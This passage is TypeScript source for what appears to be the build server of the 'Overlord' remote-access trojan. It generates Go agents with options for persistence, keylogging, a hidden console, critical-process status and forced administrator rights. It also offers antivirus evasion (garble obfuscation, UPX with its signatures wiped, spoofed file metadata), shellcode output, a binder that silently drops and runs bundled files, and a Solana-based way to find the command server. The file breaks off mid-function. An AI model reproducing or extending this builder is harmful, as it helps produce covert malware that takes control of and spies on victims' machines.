import { $ } from "bun";
import path from "path";
import fs from "fs";
import { v4 as uuidv4 } from "uuid";
import { saveBuild } from "../db";
import { logger } from "../logger";
import { getConfig } from "../config";
import { signBuildToken } from "./build-signing";
import { ensureDataDir } from "../paths";
import * as buildManager from "../build/buildManager";
import type { BuildStream } from "../build/types";
import { ALLOWED_PLATFORMS } from "./validation-constants";
import { resolveRuntimeRoot } from "./runtime-paths";
import {
  ensureToolchain,
  toolchainKeyForTarget,
  type EnsuredToolchain,
} from "./toolchain-manager";
import { runDonut } from "./donut-manager";
import { buildLinuxShellcode } from "./linux-shellcode-manager";

function isClientModuleDir(dir: string): boolean {
  return (
    fs.existsSync(path.join(dir, "go.mod")) &&
    fs.existsSync(path.join(dir, "cmd", "agent"))
  );
}

function resolveClientModuleDir(rootDir: string): string | null {
  const candidates = [
    path.join(rootDir, "Overlord-Client"),
    path.join(rootDir, "..", "Overlord-Client"),
    path.join(rootDir, "dist", "Overlord-Client"),
    path.join(rootDir, "dist", "Overlord-Client", "Overlord-Client"),
  ];

  for (const dir of candidates) {
    if (isClientModuleDir(dir)) {
      return dir;
    }
  }

  return null;
}

function resolveClientBuildCacheRoot(): string {
  const explicit = process.env.OVERLORD_CLIENT_BUILD_CACHE_DIR?.trim();
  if (explicit) {
    return path.resolve(explicit);
  }

  // Keep UI build caches under persistent app data by default.
  return path.resolve(ensureDataDir(), "client-build-cache");
}

function resolveExplicitAndroidNdkToolchainBin(): string | null {
  const explicit = process.env.ANDROID_NDK_HOME?.trim();
  if (!explicit) return null;
  const hostArch = process.arch === "arm64" ? "linux-aarch64" : "linux-x86_64";
  const toolchainBin = path.join(explicit, "toolchains", "llvm", "prebuilt", hostArch, "bin");
  try {
    return fs.existsSync(toolchainBin) ? toolchainBin : null;
  } catch {
    return null;
  }
}

type BoundFile = {
  name: string;
  data: string; // base64
  targetOS: string[]; // [] = all, otherwise ["windows","linux","darwin"]
  execute: boolean;
};

type BuildProcessConfig = {
  platforms: string[];
  serverUrl?: string;
  rawServerList?: boolean;
  mutex?: string;
  disableMutex?: boolean;
  stripDebug?: boolean;
  disableCgo?: boolean;
  obfuscate?: boolean;
  enablePersistence?: boolean;
  persistenceMethods?: string[];
  startupName?: string;
  hideConsole?: boolean;
  noPrinting?: boolean;
  disableKeylogger?: boolean;
  enableWebrtc?: boolean;
  builtByUserId?: number;
  outputName?: string;
  garbleLiterals?: boolean;
  garbleTiny?: boolean;
  garbleSeed?: string;
  assemblyTitle?: string;
  assemblyProduct?: string;
  assemblyCompany?: string;
  assemblyVersion?: string;
  assemblyCopyright?: string;
  iconBase64?: string;
  enableUpx?: boolean;
  upxStripHeaders?: boolean;
  requireAdmin?: boolean;
  criticalProcess?: boolean;
  outputExtension?: string;
  sleepSeconds?: number;
  boundFiles?: BoundFile[];
  useDonut?: boolean;
  useLinuxShellcode?: boolean;
  shellcodeConsole?: boolean;
  solMemo?: boolean;
  solAddress?: string;
  solRpcEndpoints?: string;
  iosBundleId?: string;
};


function stripUpxHeaders(filePath: string): boolean {
  try {
    const buf = Buffer.from(fs.readFileSync(filePath));
    const UPX_MAGIC = Buffer.from("UPX!");
    let modified = false;
    let offset = 0;
    while (offset < buf.length - 3) {
      const idx = buf.indexOf(UPX_MAGIC, offset);
      if (idx === -1) break;
      buf[idx] = 0x00;
      buf[idx + 1] = 0x00;
      buf[idx + 2] = 0x00;
      buf[idx + 3] = 0x00;
      modified = true;
      offset = idx + 4;
    }
    if (modified) {
      fs.writeFileSync(filePath, buf);
    }
    return modified;
  } catch {
    return false;
  }
}

type BuildProcessDeps = {
  generateBuildMutex: (length?: number) => string;
  sanitizeOutputName: (name: string) => string;
};

function detectAgentVersion(clientDir: string): string {
  try {
    const configPath = path.join(clientDir, "cmd", "agent", "config", "config.go");
    const content = fs.readFileSync(configPath, "utf8");
    const match = content.match(/var\s+AgentVersion\s*=\s*"([^"]+)"/);
    return match?.[1]?.trim() || "unknown";
  } catch {
    return "unknown";
  }
}

export async function startBuildProcess(
  buildId: string,
  config: BuildProcessConfig,
  deps: BuildProcessDeps,
): Promise<void> {
  const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
  const BUILD_STREAM_HEARTBEAT_MS = 15_000;
  const now = Date.now();

  const build: BuildStream = {
    id: buildId,
    controllers: [],
    status: "running",
    startTime: now,
    expiresAt: now + SEVEN_DAYS_MS,
    files: [],
    userId: config.builtByUserId,
  };

  buildManager.addBuildStream(buildId, build);

  const sendToStream = (data: any) => {
    const encoder = new TextEncoder();
    const message = `data: ${JSON.stringify(data)}\n\n`;
    const encoded = encoder.encode(message);

    if (data.type === "output") {
      logger.info(`[build:${buildId.substring(0, 8)}] ${data.text.trimEnd()}`);
    } else if (data.type === "status") {
      logger.info(`[build:${buildId.substring(0, 8)}] STATUS: ${data.text}`);
    } else if (data.type === "error") {
      logger.error(`[build:${buildId.substring(0, 8)}] ERROR: ${data.error}`);
    }

    const alive: ReadableStreamDefaultController[] = [];
    for (const controller of build.controllers) {
      try {
        controller.enqueue(encoded);
        alive.push(controller);
      } catch {
      }
    }
    build.controllers.length = 0;
    build.controllers.push(...alive);

    if (data.type === "complete") {
      for (const controller of build.controllers) {
        try {
          controller.close();
        } catch {}
      }
      build.controllers.length = 0;
    }
  };

  let winresTempDir: string | null = null;
  const generatedSysoFiles: string[] = [];
  let binderGenPath: string | null = null;
  let binderFilesDir: string | null = null;
  let binderLockPath: string | null = null;

  const buildStartedAt = Date.now();
  const keepAliveTimer = setInterval(() => {
    const elapsedMinutes = Math.floor((Date.now() - buildStartedAt) / 60_000);
    sendToStream({
      type: "heartbeat",
      elapsedMinutes,
      timestamp: Date.now(),
    });
  }, BUILD_STREAM_HEARTBEAT_MS);

  try {
    const serverConfig = getConfig();
    const buildAgentToken = (serverConfig.auth.agentToken || "").trim();

    sendToStream({ type: "status", text: "Preparing build environment..." });

    try {
      const goCheck = await $`go version`.quiet();
      const goVersion = goCheck.stdout.toString().trim();
      logger.info(`[build:${buildId.substring(0, 8)}] Using ${goVersion}`);
      sendToStream({ type: "output", text: `Using ${goVersion}\n`, level: "info" });
    } catch {
      const errorMsg = "Go is not installed or not in PATH. Please install Go from https://golang.org/dl/ and ensure it's in your system PATH.";
      logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg}`);
      sendToStream({ type: "output", text: `ERROR: ${errorMsg}\n`, level: "error" });
      sendToStream({ type: "error", error: errorMsg });
      sendToStream({ type: "complete", success: false });
      build.status = "failed";
      return;
    }

    const rootDir = resolveRuntimeRoot();
    const clientDir = resolveClientModuleDir(rootDir);
    if (!clientDir) {
      throw new Error(
        `Overlord-Client source not found (missing go.mod). Checked: ${path.join(rootDir, "dist", "Overlord-Client")}, ${path.join(rootDir, "Overlord-Client")}`,
      );
    }
    const agentVersion = detectAgentVersion(clientDir);
    const outDir = path.join(rootDir, "dist-clients");
    const cacheRoot = resolveClientBuildCacheRoot();
    const goBuildCacheDir = path.join(cacheRoot, "go-build");
    const goModCacheDir = path.join(cacheRoot, "go-mod");

    await Bun.$`mkdir -p ${outDir}`.quiet();
    fs.mkdirSync(goBuildCacheDir, { recursive: true });
    fs.mkdirSync(goModCacheDir, { recursive: true });
    sendToStream({ type: "output", text: `Build directory: ${outDir}\n`, level: "info" });
    sendToStream({ type: "output", text: `Client source: ${clientDir}\n`, level: "info" });
    sendToStream({ type: "output", text: `Stub version: ${agentVersion}\n`, level: "info" });
    sendToStream({ type: "output", text: `Client build cache: ${cacheRoot}\n`, level: "info" });

    const platformsToBuild = (config.platforms || []).filter((p) => ALLOWED_PLATFORMS.has(p));
    if (platformsToBuild.length !== (config.platforms || []).length) {
      throw new Error("One or more requested platforms are not allowed");
    }

    const hasAndroidTargets = platformsToBuild.some((p) => p.startsWith("android-"));
    const hasBsdTargets = platformsToBuild.some(
      (p) => p.startsWith("freebsd-") || p.startsWith("openbsd-"),
    );
    const hasIosTargets = platformsToBuild.some((p) => p.startsWith("ios-"));

    if (hasAndroidTargets) {
      sendToStream({
        type: "output",
        text: "WARNING: Android targets are severely untested and will probably not work right.\n",
        level: "warn",
      });
    }

    if (hasBsdTargets) {
      sendToStream({
        type: "output",
        text: "WARNING: BSD targets are severely untested and will probably not work right.\n",
        level: "warn",
      });
    }

    if (hasIosTargets) {
      sendToStream({
        type: "output",
        text: "WARNING: iOS targets are experimental (POC). Most features will be stubbed. CGO will be force-disabled.\n",
        level: "warn",
      });
    }

    let ndkBin: string | null = null;
    if (hasAndroidTargets) {
      ndkBin = resolveExplicitAndroidNdkToolchainBin();
      if (!ndkBin) {
        try {
          const ndk = await ensureToolchain("android-ndk", sendToStream);
          ndkBin = ndk.binDir;
        } catch (err: any) {
          sendToStream({
            type: "output",
            text: `Warning: Android NDK download failed (${err.message || err}). Android builds require the NDK. Set ANDROID_NDK_HOME to use a pre-installed NDK.\n`,
            level: "warn",
          });
        }
      }
    }

    let buildMutex = "";
    if (!config.disableMutex) {
      buildMutex = config.mutex || deps.generateBuildMutex();
      sendToStream({ type: "output", text: `Mutex: ${buildMutex}\n`, level: "info" });
    } else {
      sendToStream({ type: "output", text: "Mutex: disabled\n", level: "info" });
    }

    const buildTag = await signBuildToken({
      v: 1,
      bid: buildId,
      uid: config.builtByUserId ?? null,
      iat: Math.floor(Date.now() / 1000),
    });
    sendToStream({ type: "output", text: `Build tag: signed (bid=${buildId.substring(0, 8)})\n`, level: "info" });

    if (config.outputName) {
      sendToStream({ type: "output", text: `Custom output name: ${config.outputName}\n`, level: "info" });
    }

    let upxBin: string | null = null;
    if (config.enableUpx) {
      try {
        const upxTool = await ensureToolchain("upx", sendToStream);
        upxBin = path.join(upxTool.binDir, "upx");
      } catch (err: any) {
        sendToStream({
          type: "output",
          text: `ERROR: UPX is not installed and on-demand download failed (${err.message || err}).\n`,
          level: "error",
        });
        throw new Error("UPX not found");
      }
    }

    const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64 || config.requireAdmin);
    const hasWindowsTargets = platformsToBuild.some((p) => p.startsWith("windows-"));

    if (hasAssemblyData && hasWindowsTargets) {
      sendToStream({ type: "status", text: "Generating Windows resource data..." });

      const goEnvResult = await $`go env GOPATH`.quiet();
      const goPath = goEnvResult.stdout.toString().trim();
      const goBinDir = process.env.GOBIN || (goPath ? path.join(goPath, "bin") : "");
      const winresExe = process.platform === "win32" ? "go-winres.exe" : "go-winres";
      let winresBin = "go-winres";

      let hasWinres = false;
      if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
        winresBin = path.join(goBinDir, winresExe);
        hasWinres = true;
      } else {
        try {
          await $`go-winres version`.quiet();
          hasWinres = true;
        } catch {
          try {
            sendToStream({ type: "output", text: "Installing go-winres...\n", level: "info" });
            await $`go install github.com/tc-hib/go-winres@latest`.env({ ...process.env, GOMODCACHE: goModCacheDir }).quiet();
            if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
              winresBin = path.join(goBinDir, winresExe);
              hasWinres = true;
            }
          } catch (installErr: any) {
            sendToStream({ type: "output", text: `WARNING: Failed to install go-winres: ${installErr.message || installErr}. Assembly data/icon will be skipped.\n`, level: "warn" });
          }
        }
      }

      if (hasWinres) {
        const agentDir = path.join(clientDir, "cmd", "agent");
        const winresLockPath = path.join(agentDir, ".winres.lock");

        if (fs.existsSync(winresLockPath)) {
          sendToStream({
            type: "output",
            text: "WARNING: Another build is currently generating Windows resources for this client. Skipping winres for this build.\n",
            level: "warn",
          });
        } else {
          // Acquire a simple lock so only one build at a time touches cmd/agent/*.syso
          fs.writeFileSync(winresLockPath, String(process.pid));
          try {
            sendToStream({ type: "output", text: `Using go-winres: ${winresBin}\n`, level: "info" });
            winresTempDir = path.join(outDir, `.winres-${buildId.substring(0, 8)}`);
            fs.mkdirSync(winresTempDir, { recursive: true });

            const winresConfig: any = {};

            if (config.iconBase64) {
              try {
                const iconBuffer = Buffer.from(config.iconBase64, "base64");
                const iconPath = path.join(winresTempDir, "icon.ico");
                fs.writeFileSync(iconPath, iconBuffer);
                winresConfig["RT_GROUP_ICON"] = { "#1": { "0000": "icon.ico" } };
                sendToStream({ type: "output", text: `Icon embedded (${iconBuffer.length} bytes)\n`, level: "info" });
              } catch (iconErr: any) {
                sendToStream({ type: "output", text: `WARNING: Failed to process icon: ${iconErr.message}. Skipping icon.\n`, level: "warn" });
              }
            }

            const versionStr = config.assemblyVersion || "0.0.0.0";
            const winExt = config.outputExtension || ".exe";
            const versionInfo: any = {
              "0409": {
                "FileDescription": config.assemblyTitle || "",
                "ProductName": config.assemblyProduct || "",
                "CompanyName": config.assemblyCompany || "",
                "FileVersion": versionStr,
                "ProductVersion": versionStr,
                "LegalCopyright": config.assemblyCopyright || "",
                "OriginalFilename": config.outputName ? (config.outputName + winExt) : "",
              },
            };

            winresConfig["RT_VERSION"] = {
              "#1": {
                "0000": {
                  "fixed": {
                    "file_version": versionStr,
                    "product_version": versionStr,
                  },
                  "info": versionInfo,
                },
              },
            };

            const winresJsonPath = path.join(winresTempDir, "winres.json");
            if (config.requireAdmin) {
              winresConfig["RT_MANIFEST"] = {
                "#1": {
                  "0000": {
                    "identity": {},
                    "description": "",
                    "minimum-os": "vista",
                    "execution-level": "requireAdministrator",
                    "ui-access": false,
                    "auto-elevate": false,
                    "dpi-awareness": "system",
                    "disable-theming": false,
                    "disable-window-filtering": false,
                    "high-resolution-scrolling-aware": false,
                    "ultra-high-resolution-scrolling-aware": false,
                    "long-path-aware": false,
                    "printer-driver-isolation": false,
                    "gdi-scaling": false,
                    "segment-heap": false,
                    "use-common-controls-v6": false,
                  },
                },
              };
              sendToStream({ type: "output", text: "UAC manifest: requireAdministrator\n", level: "info" });
            }
            fs.writeFileSync(winresJsonPath, JSON.stringify(winresConfig, null, 2));
            sendToStream({ type: "output", text: `Winres config: ${winresJsonPath}\n`, level: "info" });

            const sysoOutPrefix = path.join(agentDir, "rsrc");
            try {
              const winresResult = await $`${winresBin} make --in ${winresJsonPath} --out ${sysoOutPrefix}`.cwd(winresTempDir).nothrow().quiet();
              if (winresResult.exitCode !== 0) {
                const stderr = winresResult.stderr.toString().trim();
                sendToStream({ type: "output", text: `WARNING: go-winres failed (exit ${winresResult.exitCode}): ${stderr}\nBuilding without assembly data.\n`, level: "warn" });
              } else {
                for (const f of fs.readdirSync(agentDir)) {
                  if (f.startsWith("rsrc") && f.endsWith(".syso")) {
                    generatedSysoFiles.push(path.join(agentDir, f));
                  }
                }
                sendToStream({ type: "output", text: `Windows resources generated (${generatedSysoFiles.length} .syso files)\n`, level: "info" });
              }
            } catch (winresErr: any) {
              sendToStream({ type: "output", text: `WARNING: go-winres failed: ${winresErr.message || winresErr}. Building without assembly data.\n`, level: "warn" });
            }
          } finally {
            try {
              fs.unlinkSync(winresLockPath);
            } catch {
              // ignore errors removing the lock
            }
          }
        }
      }
    }

    // ── Binder: embed files into the agent ────────────────────────────────────
    const hasBoundFiles = Array.isArray(config.boundFiles) && config.boundFiles.length > 0;
    if (hasBoundFiles) {
      sendToStream({ type: "status", text: "Setting up bound files..." });

      const agentDir = path.join(clientDir, "cmd", "agent");
      binderLockPath = path.join(agentDir, ".binder.lock");
      binderGenPath = path.join(agentDir, "binder_gen.go");
      binderFilesDir = path.join(agentDir, "bindfiles");

      // Wait up to 5 minutes to acquire the binder lock (serializes concurrent builds with bound files)
      const BINDER_POLL_MS = 1500;
      const BINDER_TIMEOUT_MS = 5 * 60 * 1000;
      const lockWaitStart = Date.now();
      while (fs.existsSync(binderLockPath)) {
        if (Date.now() - lockWaitStart > BINDER_TIMEOUT_MS) {
          throw new Error(
            "Could not acquire binder lock after 5 minutes. Another build may have stalled. Please try again.",
          );
        }
        sendToStream({ type: "output", text: "Waiting for binder lock...\n", level: "warn" });
        await new Promise((r) => setTimeout(r, BINDER_POLL_MS));
      }
      fs.writeFileSync(binderLockPath, `${process.pid},${buildId}`);

      try {
        fs.mkdirSync(binderFilesDir, { recursive: true });

        const manifest: { name: string; targetOS: string[]; execute: boolean }[] = [];
        for (const bf of config.boundFiles!) {
          const fileBytes = Buffer.from(bf.data, "base64");
          fs.writeFileSync(path.join(binderFilesDir, bf.name), fileBytes, { mode: 0o755 });
          manifest.push({ name: bf.name, targetOS: bf.targetOS, execute: bf.execute });
          sendToStream({
            type: "output",
            text: `Bound file: ${bf.name} (${fileBytes.length} bytes)${bf.targetOS.length > 0 ? ` [${bf.targetOS.join(",")}]` : " [all OS]"}${bf.execute ? " [exec]" : ""}\n`,
            level: "info",
          });
        }
        fs.writeFileSync(
          path.join(binderFilesDir, "manifest.json"),
          JSON.stringify({ files: manifest }, null, 2),
        );

        const binderGoCode = `//go:build hasbinder

package main

import (
\t"embed"
\t"encoding/json"
\t"os"
\t"os/exec"
\t"path/filepath"
\t"runtime"
)

//go:embed bindfiles
var boundFilesFS embed.FS

type binderFileEntry struct {
\tName     string   \`json:"name"\`
\tTargetOS []string \`json:"targetOS"\`
\tExecute  bool     \`json:"execute"\`
}

type binderManifest struct {
\tFiles []binderFileEntry \`json:"files"\`
}

func runBoundFiles() {
\tmanifestData, err := boundFilesFS.ReadFile("bindfiles/manifest.json")
\tif err != nil {
\t\treturn
\t}
\tvar manifest binderManifest
\tif err := json.Unmarshal(manifestData, &manifest); err != nil {
\t\treturn
\t}
\tif len(manifest.Files) == 0 {
\t\treturn
\t}
\ttmpDir, err := os.MkdirTemp("", "ovld_")
\tif err != nil {
\t\treturn
\t}
\tfor _, entry := range manifest.Files {
\t\tif len(entry.TargetOS) > 0 {
\t\t\tmatched := false
\t\t\tfor _, t := range entry.TargetOS {
\t\t\t\tif t == runtime.GOOS {
\t\t\t\t\tmatched = true
\t\t\t\t\tbreak
\t\t\t\t}
\t\t\t}
\t\t\tif !matched {
\t\t\t\tcontinue
\t\t\t}
\t\t}
\t\tdata, err := boundFilesFS.ReadFile("bindfiles/" + entry.Name)
\t\tif err != nil {
\t\t\tcontinue
\t\t}
\t\toutPath := filepath.Join(tmpDir, entry.Name)
\t\tif err := os.WriteFile(outPath, data, 0755); err != nil {
\t\t\tcontinue
\t\t}
\t\tif entry.Execute {
\t\t\tvar cmd *exec.Cmd
\t\t\tswitch runtime.GOOS {
\t\t\tcase "windows":
\t\t\t\tcmd = exec.Command("cmd", "/c", "start", "", outPath)
\t\t\tcase "darwin":
\t\t\t\tcmd = exec.Command("open", outPath)
\t\t\tdefault:
\t\t\t\tcmd = exec.Command("xdg-open", outPath)
\t\t\t}
\t\t\t_ = cmd.Start()
\t\t}
\t}
}
`;
        fs.writeFileSync(binderGenPath, binderGoCode);
        sendToStream({
          type: "output",
          text: `Binder ready: ${config.boundFiles!.length} file(s) will be embedded\n`,
          level: "info",
        });
      } catch (binderErr: any) {
        // Release lock on setup failure
        try { fs.unlinkSync(binderLockPath); } catch {}
        binderLockPath = null;
        throw new Error(`Binder setup failed: ${binderErr.message || binderErr}`);
      }
    }
    // ── End binder setup ──────────────────────────────────────────────────────

    for (const platform of platformsToBuild) {
      const [os, arch, ...rest] = platform.split("-");
      const goarm = arch === "armv7" ? "7" : undefined;
      const actualArch = goarm ? "arm" : arch;
      // iOS builds use GOOS=darwin with a custom build tag since GOOS=ios requires CGO/Xcode
      const isIosTarget = os === "ios";
      const effectiveOs = isIosTarget ? "darwin" : os;
      const targetKey = `${effectiveOs}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
      const namePrefix = config.outputName || "agent";
      const winExt = config.outputExtension || ".exe";
      const outputName = deps.sanitizeOutputName(
        platform.includes("windows") ? `${namePrefix}-${platform}${winExt}` : `${namePrefix}-${platform}`,
      );

      sendToStream({ type: "status", text: `Building ${platform}...` });
      sendToStream({ type: "output", text: `\n=== Building ${platform} ===\n`, level: "info" });

      const env: NodeJS.ProcessEnv = {
        ...process.env,
        GOOS: effectiveOs,
        GOARCH: actualArch,
        CGO_ENABLED: config.disableCgo === true ? "0" : "1",
        GOWORK: "off",
        GOCACHE: goBuildCacheDir,
        GOMODCACHE: goModCacheDir,
        ...(goarm ? { GOARM: goarm } : {}),
      };

      if (targetKey === "windows/arm64" && env.CGO_ENABLED === "1") {
        env.CGO_ENABLED = "0";
        sendToStream({
          type: "output",
          text: "WARNING: windows/arm64 builds do not support CGO in this pipeline; forcing CGO disabled for this target.\n",
          level: "warn",
        });
      }

      if (isIosTarget && env.CGO_ENABLED === "1") {
        env.CGO_ENABLED = "0";
        sendToStream({
          type: "output",
          text: "WARNING: iOS builds require Xcode toolchain for CGO; forcing CGO disabled for this target.\n",
          level: "warn",
        });
      }

      if (
        effectiveOs === "darwin" &&
        !isIosTarget &&
        process.platform !== "darwin" &&
        env.CGO_ENABLED === "1"
      ) {
        env.CGO_ENABLED = "0";
        sendToStream({
          type: "output",
          text: "WARNING: Cross-compiling to darwin from a non-macOS host requires an osxcross/macOS SDK toolchain, which is not bundled. Forcing CGO disabled for this target. Build natively on macOS for full CGO support.\n",
          level: "warn",
        });
      }

      if (env.CGO_ENABLED === "1") {
        let cc: string | undefined;
        let cxx: string | undefined;
        let extraBinDir: string | undefined;

        if (os === "android" && ndkBin) {
          const ndkCcByTarget: Record<string, string> = {
            "android/amd64": "x86_64-linux-android21-clang",
            "android/arm64": "aarch64-linux-android21-clang",
            "android/arm/v7": "armv7a-linux-androideabi21-clang",
          };
          const basename = ndkCcByTarget[targetKey];
          if (basename) {
            cc = path.join(ndkBin, basename);
            cxx = path.join(ndkBin, `${basename}++`);
            extraBinDir = ndkBin;
            env.AR = path.join(ndkBin, "llvm-ar");
          }
        } else {
          const tcKey = toolchainKeyForTarget(targetKey);
          if (tcKey) {
            try {
              const tc: EnsuredToolchain = await ensureToolchain(tcKey, sendToStream);
              cc = tc.ccPath;
              cxx = tc.cxxPath;
              extraBinDir = tc.binDir;
              if (tc.arPath) env.AR = tc.arPath;
            } catch (err: any) {
              sendToStream({
                type: "output",
                text: `ERROR: Failed to provision cross-compile toolchain for ${targetKey}: ${err.message || err}\n`,
                level: "error",
              });
              throw err;
            }
          }
        }

        if (cc) {
          env.CC = cc;
          sendToStream({ type: "output", text: `CGO compiler: ${cc}\n`, level: "info" });
        } else {
          sendToStream({
            type: "output",
            text: `CGO compiler not mapped for ${targetKey}; falling back to default compiler lookup\n`,
            level: "warn",
          });
        }
        if (cxx) {
          env.CXX = cxx;
        }
        if (extraBinDir) {
          const sep = process.platform === "win32" ? ";" : ":";
          env.PATH = `${extraBinDir}${sep}${env.PATH || process.env.PATH || ""}`;
        }
      }

      let ldflags = config.stripDebug !== false ? "-s -w -buildid=" : "";

      if (config.serverUrl) {
        const serverFlag = `-X overlord-client/cmd/agent/config.DefaultServerURL=${config.serverUrl}`;
        ldflags = `${ldflags} ${serverFlag}`;
        sendToStream({ type: "output", text: `Server URL: ${config.serverUrl}\n`, level: "info" });
      }

      if (config.rawServerList) {
        const rawServerFlag = "-X overlord-client/cmd/agent/config.DefaultServerURLIsRaw=true";
        ldflags = ldflags ? `${ldflags} ${rawServerFlag}` : rawServerFlag;
        sendToStream({ type: "output", text: "Raw server list: enabled\n", level: "info" });
      }

      if (config.solMemo) {
        const solFlag = "-X overlord-client/cmd/agent/config.DefaultServerURLIsSol=true";
        ldflags = ldflags ? `${ldflags} ${solFlag}` : solFlag;
        sendToStream({ type: "output", text: "Solana memo lookup: enabled\n", level: "info" });

        if (config.solAddress) {
          const solAddrFlag = `-X overlord-client/cmd/agent/config.DefaultSolAddress=${config.solAddress}`;
          ldflags = `${ldflags} ${solAddrFlag}`;
          sendToStream({ type: "output", text: `Solana address: ${config.solAddress}\n`, level: "info" });
        }

        if (config.solRpcEndpoints) {
          const solRpcFlag = `-X overlord-client/cmd/agent/config.DefaultSolRPCEndpoints=${config.solRpcEndpoints}`;
          ldflags = `${ldflags} ${solRpcFlag}`;
          sendToStream({ type: "output", text: `Solana RPC endpoints: ${config.solRpcEndpoints}\n`, level: "info" });
        }
      }

      if (buildMutex) {
        const mutexFlag = `-X overlord-client/cmd/agent/config.DefaultMutex=${buildMutex}`;
        ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
      }

      if (config.enablePersistence) {
        if (!platform.startsWith('android-')) {
          const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
          ldflags = ldflags ? `${ldflags} ${persistenceFlag}` : persistenceFlag;
          const activeMethods = config.persistenceMethods && config.persistenceMethods.length > 0
            ? config.persistenceMethods
            : ['startup'];
          sendToStream({ type: "output", text: `Persistence enabled for ${platform} (methods: ${activeMethods.join(', ')})\n`, level: "info" });
          if (config.startupName) {
            const startupNameFlag = `-X overlord-client/cmd/agent/persistence.DefaultStartupName=${config.startupName}`;
            ldflags = `${ldflags} ${startupNameFlag}`;
            sendToStream({ type: "output", text: `Startup name: ${config.startupName}\n`, level: "info" });
          }
        } else {
          sendToStream({ type: "output", text: `Persistence is not supported on ${platform}, skipping...\n`, level: "warning" });
        }
      }

      if (buildAgentToken) {
        const agentTokenFlag = `-X overlord-client/cmd/agent/config.DefaultAgentToken=${buildAgentToken}`;
        ldflags = ldflags ? `${ldflags} ${agentTokenFlag}` : agentTokenFlag;
      }

      if (buildTag) {
        const buildTagFlag = `-X overlord-client/cmd/agent/config.DefaultBuildTag=${buildTag}`;
        ldflags = ldflags ? `${ldflags} ${buildTagFlag}` : buildTagFlag;
      }

      if (config.sleepSeconds && config.sleepSeconds > 0) {
        const sleepFlag = `-X overlord-client/cmd/agent/config.DefaultSleepSeconds=${config.sleepSeconds}`;
        ldflags = ldflags ? `${ldflags} ${sleepFlag}` : sleepFlag;
        sendToStream({ type: "output", text: `Startup sleep: ${config.sleepSeconds}s\n`, level: "info" });
      }

      if (config.hideConsole && os === "windows") {
        const hideConsoleFlag = "-H=windowsgui";
        ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
        sendToStream({ type: "output", text: "Windows console hidden (GUI subsystem)\n", level: "info" });
      }

      if (config.criticalProcess && os === "windows") {
        const criticalFlag = "-X overlord-client/cmd/agent/config.DefaultCriticalProcess=true";
        ldflags = ldflags ? `${ldflags} ${criticalFlag}` : criticalFlag;
        sendToStream({ type: "output", text: "Critical process: enabled (requires admin at runtime)\n", level: "info" });
      }

      if (config.obfuscate) {
        sendToStream({ type: "output", text: "Obfuscation enabled (garble)\n", level: "info" });
        if (config.garbleLiterals) {
          sendToStream({ type: "output", text: "Garble: obfuscate literals (-literals)\n", level: "info" });
        }
        if (config.garbleTiny) {
          sendToStream({ type: "output", text: "Garble: tiny mode (-tiny)\n", level: "info" });
        }
        if (config.garbleSeed) {
          sendToStream({ type: "output", text: `Garble: seed=${config.garbleSeed}\n`, level: "info" });
        }
      }

      if (config.noPrinting) {
        sendToStream({ type: "output", text: "Client printing disabled (noprint tag)\n", level: "info" });
      }
      if (config.disableKeylogger) {
        sendToStream({ type: "output", text: "Keylogger disabled (nokeylogger tag)\n", level: "info" });
      }

      // Linux CGO builds must be fully statically linked to avoid glibc version
      // mismatches between the build server and target machines.
      if (os === "linux" && env.CGO_ENABLED === "1") {
        const staticFlag = "-extldflags '-static'";
        ldflags = ldflags ? `${ldflags} ${staticFlag}` : staticFlag;
        sendToStream({ type: "output", text: "Linux CGO: static linking enabled (avoids GLIBC version mismatch)\n", level: "info" });
      }

      // Compile the plugin host shim so the agent can embed it via //go:embed.
      // The shim is a small dynamically-linked binary that dlopen()s plugins on
      // behalf of the statically-linked agent (static musl cannot call dlopen).
      // We use the native 'cc' for amd64 (glibc, works on most servers) and the
      // musl cross-compiler for arm targets (works on musl/Alpine targets).
      if (os === "linux" && env.CGO_ENABLED === "1") {
        const pluginHostSrc = path.join(clientDir, "cmd/agent/plugins/plugin_host/plugin_host.c");
        if (fs.existsSync(pluginHostSrc)) {
          const archSuffix = actualArch === "amd64" ? "amd64"
                           : actualArch === "arm64" ? "arm64"
                           : "arm";
          const pluginHostOut = path.join(clientDir, `cmd/agent/plugins/plugin_host/plugin_host_${archSuffix}`);
          // For amd64 compile a fully static glibc binary (-static -ldl) so the
          // shim has no shared library dependencies and runs on any glibc version.
          // Static glibc can still call dlopen at runtime via the system ld-linux.so.2.
          // For cross-compiled arches use env.CC (musl cross-compiler) without -static.
          const hostCC = actualArch === "amd64" ? "cc" : (env.CC || "cc");
          const shimExtraFlags = actualArch === "amd64" ? ["-static"] : [];
          sendToStream({ type: "output", text: `Compiling plugin host shim (${archSuffix}) with ${hostCC}...\n`, level: "info" });
          try {
            const compileProc = $`${hostCC} -O2 -o ${pluginHostOut} ${pluginHostSrc} ${shimExtraFlags} -ldl`.nothrow();
            let compileOut = "";
            for await (const line of compileProc.lines()) { compileOut += line + "\n"; }
            const compileResult = await compileProc;
            if (compileResult.exitCode !== 0) {
              sendToStream({ type: "output", text: `Warning: plugin host shim compilation failed — plugins will fall back to direct dlopen:\n${compileOut}\n`, level: "warn" });
            } else {
              sendToStream({ type: "output", text: `Plugin host shim compiled: ${pluginHostOut}\n`, level: "info" });
            }
          } catch (err: any) {
            sendToStream({ type: "output", text: `Warning: plugin host shim compilation error — ${err?.message || err}\n`, level: "warn" });
          }
        }
      }

      const isShellcodeMode = !!(config.useDonut || config.useLinuxShellcode);

      try {
        logger.info(`[build:${buildId.substring(0, 8)}] GOOS=${os} GOARCH=${actualArch} CGO=${env.CGO_ENABLED} CC=${env.CC || "<default>"} shellcode=${isShellcodeMode}`);

        const garbleFlags: string[] = [];
        if (config.obfuscate) {
          if (config.garbleLiterals) garbleFlags.push("-literals");
          if (config.garbleTiny) garbleFlags.push("-tiny");
          if (config.garbleSeed) garbleFlags.push(`-seed=${config.garbleSeed}`);
        }

        // Base tags: always present regardless of build pass
